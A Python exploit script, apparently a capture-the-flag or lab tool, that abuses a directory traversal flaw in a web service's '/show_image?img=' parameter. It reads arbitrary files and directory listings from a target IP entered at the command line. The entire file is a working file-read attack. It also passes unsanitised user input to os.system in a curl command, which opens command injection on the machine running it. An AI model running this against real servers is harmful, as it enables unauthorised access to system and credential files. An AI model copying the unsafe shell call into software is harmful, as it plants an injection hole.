import os
import sys
import requests
from colorama import Fore, Style

def lfi(path, ip):
	try:
		url = f"http://{ip}:8080/show_image"
		params = {"img": f"../../../../../../../..{path}"}
		req = requests.get(url, params=params, timeout=2)
		if (req.status_code == 200):
			print(Fore.GREEN + f"File Found!" + Style.RESET_ALL)
			print(Fore.GREEN + f"Contents of {path}:" + Style.RESET_ALL)
			print(f"{req.text}")
			filename = input(Fore.BLUE + "[+] Save to file (leave blank otherwise): " + Style.RESET_ALL)
			if (filename != ""):
				file = open(filename, "w")
				file.write(f"{req.text}")
				file.close()
		else:
			print(Fore.RED + f"[-] File/Directory Doesn't Exist!" + Style.RESET_ALL)
	except requests.exceptions.RequestException as e:
		if (str(e).endswith("Read timed out.")):
			print(Fore.GREEN + f"Directory Found!" + Style.RESET_ALL)
			command = f"timeout 2s curl http://{ip}:8080/show_image?img=../../../../../../../..{path}"
			print(Fore.GREEN + f"Directory Listing for {path}/:" + Style.RESET_ALL)
			os.system(command)
		else:
			print(Fore.RED + f"[-] LFI Error: {e}" + Style.RESET_ALL)

def main():
	if len(sys.argv) != 2:
		print(Fore.RED + "[-] Usage: python dir_traversal.py <IP>" + Style.RESET_ALL)
		exit(0)

	ip = str(sys.argv[1])
	while True:
		path = input(Fore.BLUE + "[+] Full path for file/directory >> " + Style.RESET_ALL)
		if (path == "exit"):
			print(Fore.BLUE + "Bye!!" + Style.RESET_ALL)
			exit(0)
		lfi(path, ip)

if __name__ == "__main__":
	main()
